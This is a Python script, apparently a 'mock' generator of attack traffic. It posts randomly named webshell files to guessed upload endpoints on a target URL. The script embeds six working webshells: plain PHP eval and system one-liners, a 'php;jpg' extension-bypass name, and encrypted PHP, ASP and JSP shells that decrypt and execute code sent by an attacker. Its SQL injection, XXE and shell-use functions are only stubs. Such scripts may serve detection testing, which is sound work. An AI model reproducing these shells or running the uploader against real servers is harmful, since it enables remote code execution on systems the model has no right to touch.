import requests
import random
from urllib3 import encode_multipart_formdata
#mock webshell_upload  SQLI webshell_useing
#
webshells={1:{'fn':'123456789.php','fd':'<?php @eval($_POST[\'666666\']);?>'},
           2:{'fn':'123456789.php','fd':'<?php @system($_POST[\'666666\']);?>'},
           3:{'fn':'123456789.php;jpg','fd':'<?php @system($_POST[\'666666\']);?>'},
           4:{'fn':'123456789.php','fd':'<?php\n@error_reporting(0);\nsession_start();\nif (isset($_GET[\'666666\']))\n{\n    $key=substr(md5(uniqid(rand())),16);\n    $_SESSION[\'k\']=$key;\n    print $key;\n}\nelse\n{\n    $key=$_SESSION[\'k\'];\n	$post=file_get_contents(\"php://input\");\n	if(!extension_loaded(\'openssl\'))\n	{\n		$t=\"base64_\".\"decode\";\n		$post=$t($post.\"\");\n		\n		for($i=0;$i<strlen($post);$i++) {\n    			 $post[$i] = $post[$i]^$key[$i+1&15]; \n    			}\n	}\n	else\n	{\n		$post=openssl_decrypt($post, \"AES128\", $key);\n	}\n    $arr=explode(\'|\',$post);\n    $func=$arr[0];\n    $params=$arr[1];\n	class C{public function __construct($p) {eval($p.\"\");}}\n	@new C($params);\n}\n?>'},
           5:{'fn':'123456789.asp','fd':'<%\nResponse.CharSet = \"UTF-8\" \nIf Request.ServerVariables(\"REQUEST_METHOD\")=\"GET\" And Request.QueryString(\"666666\") Then\nFor a=1 To 8\nRANDOMIZE\nk=Hex((255-17)*rnd+16)+k\nNext\nSession(\"k\")=k\nresponse.write(k)\nElse\nk=Session(\"k\")\nsize=Request.TotalBytes\ncontent=Request.BinaryRead(size)\nFor i=1 To size\nresult=result&Chr(ascb(midb(content,i,1)) Xor Asc(Mid(k,(i and 15)+1,1)))\nNext\nexecute(result)\nEnd If\n%>'},
           6: {'fn': '123456789.jsp', 'fd': '<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if(request.getParameter(\"666666\")!=null){String k=(\"\"+UUID.randomUUID()).replace(\"-\",\"\").substring(16);session.putValue(\"u\",k);out.print(k);return;}Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec((session.getValue(\"u\")+\"\").getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%>'},
           }
UA={1:'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0',
    2:'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Edg/88.0.705.74',
    3:'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; Tablet PC 2.0)',
    4:'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.57 Safari/537.17'
    }
HADER={
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
'Accept-Encoding': 'gzip, deflate',
'Pragma': 'no-cache',
'Cache-Control': 'no-cache'
}

uppaths={1:'upload.php',2:'upload',3:'?/upload',4:'?mothod=upload',5:'?c=upload'}
sqlipaths={1:'news.php?id=',2:'?id=',3:'search.php?name=',4:'login.php?name=',5:'?c=edit&m='}
sqlis={1:'1 and 1=1',2:'',3:'',4:'',5:'',6:''}
def gen_str(mode=0):
    table = 'abcdefghijklmnopqrstuvwxyz0123456789'
    if(mode==1):
        table +='ABCDEFGHIJKLMNOPQRSTOVWXYZ!@#$%^&*()'
    return ''.join(random.sample(table, random.randint(4, 8)))
def webshell_upload(url='http://www.baidu.com/'):
    print('test1')
    url+=uppaths[random.randint(1, 5)]
    data = {}
    sn=random.randint(1, 6)
    data['file'] = (webshells[sn]['fn'].replace("123456789",gen_str()), webshells[sn]['fd'].replace("666666",gen_str(1)))
    encode_data = encode_multipart_formdata(data)
    r = requests.post(url,data=encode_data[0],headers=dict(HADER,**{'User-Agent':UA[random.randint(1, 4)],'Content-Type':encode_data[1]}))
    print (r.text)
def SQLI(url='http://www.baidu.com/'):
    mode=1
    url+=sqlipaths[random.randint(1, 5)]
    r = requests.get(url,headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)]}))
    print('test3')
    r =requests.get('https://www.baidu.com/')
def webshell_useing():
    mode=1
    print('test4')
    r =requests.get('https://www.baidu.com/')
def XXE():
    mode=1
    print('test5')
    r =requests.get('https://www.baidu.com/')
def other():
    return

def Make():
    switch = {1:webshell_upload, 2:SQLI, 3:webshell_useing, 4:XXE, 5:other}
    mode=1
    if mode==-1:
        mode=random.randint(1, 4)
    switch[mode]()

if __name__ == '__main__':
    Make()
